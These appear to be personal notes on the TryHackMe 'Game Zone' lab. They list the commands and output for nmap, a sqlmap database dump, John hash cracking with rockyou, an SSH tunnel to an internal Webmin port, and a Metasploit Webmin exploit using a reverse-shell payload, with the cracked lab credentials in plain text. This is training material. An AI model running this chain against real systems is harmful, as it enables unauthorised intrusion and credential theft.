#THM #SqlMap #SSH_tunnel #Metasploit  #EscaltePriv 

#### Nmap
```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
   | ssh-hostkey: 
   |   2048 61:ea:89:f1:d4:a7:dc:a5:50:f7:6d:89:c3:af:0b:03 (RSA)
   |   256 b3:7d:72:46:1e:d3:41:b6:6a:91:15:16:c9:4a:a5:fa (ECDSA)
   |_  256 53:67:09:dc:ff:fb:3a:3e:fb:fe:cf:d8:6d:41:27:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
   | http-cookie-flags: 
   |   /: 
   |     PHPSESSID: 
   |_      httponly flag not set
   |_http-title: Game Zone
   |_http-server-header: Apache/2.4.18 (Ubuntu)

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

#### SQLMap

* capture search request with
```bash
sqlmap -r ~/Desktop/boxes/gamezone/sql.req --dbms=mysql --dump
```
* -r use this intercepted request
* --dbms tells SQLMap what tye of DB system is used
* --dump attempts to output the entire DB

```bash
+------------------------------------------------------------------+----------+
| pwd                                                              | username |
+------------------------------------------------------------------+----------+
| ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14 | agent47  |
+------------------------------------------------------------------+----------+
sha256_generic_passwd -> cracked : videogamer124

Database: db
Table: post
[5 entries]
| id  | name | description |
| --- | ---- | ----------- |
| 1   | Mortal Kombat 11               | Its a rare fighting game that hits just about every note as strongly as Mortal Kombat 11 does. Everything from its methodical and deep combat.                       
| 2   | Marvel Ultimate Alliance 3     | Switch owners will find plenty of content to chew through, particularly with friends, and while it may be the gaming equivalent to a Hulk Smash, that isnt to say that it isnt a rollicking good time. 
| 3   | SWBF2 2005                     | Best game ever  
| 4   | Hitman 2                       | Hitman 2 doesnt add much of note to the structure of its predecessor and thus feels more like Hitman 1.5 than a full-blown sequel. But thats not a bad thing.    
| 5   | Call of Duty: Modern Warfare 2 | When you look at the total package, Call of Duty: Modern Warfare 2 is hands-down one of the best first-person shooters out there, and a truly amazing offering across any system.
```

#### John the Ripper

```bash
john "hash.txt" --wordlist="/usr/share/wordlists/rockyou.txt" --format=Raw-SHA256
```

#### Exposing Services with reverse SSH tunnel

![img](https://i.imgur.com/cYZsC8p.png)
* **-L** is a local tunnel (YOU <-- SERVER)
	* For example, if imgur was blocked at work, you can do **ssh -L 9000:imgur.com:80 user@example.com**
* **-R** is a remote tunnel (YOU --> SERVER)
	* Similar to the example above, but in reverse
*  tool called **ss**
	*  investigate sockets running on a host
	* we see that port 10000 can be accesst localy but not outside because of a firewall rule
		* Using an SSH Tunnel we can expose the port to us (locally)
			
![[Pasted image 20211216025931.png]]

```bash
ss -tlpn
sshpass -p videogamer124 ssh -L 9999:localhost:10000 -l agent47 10.10.104.15
```

![[Pasted image 20211216031257.png]]

#### Priviledge Escalation

```bash
use exploit unix/webapp/webmin_show_cgi_exec
set RHOSTS 127.0.0.1
set RPORT 9999
set USERNAME agent47
set PASSWORD videogamer124
set SSL false
set payload cmd/unix/reverse

...
[*] Session 1 created in the background.
sessions -u 1	
sessions -i 2
meterpreter >
```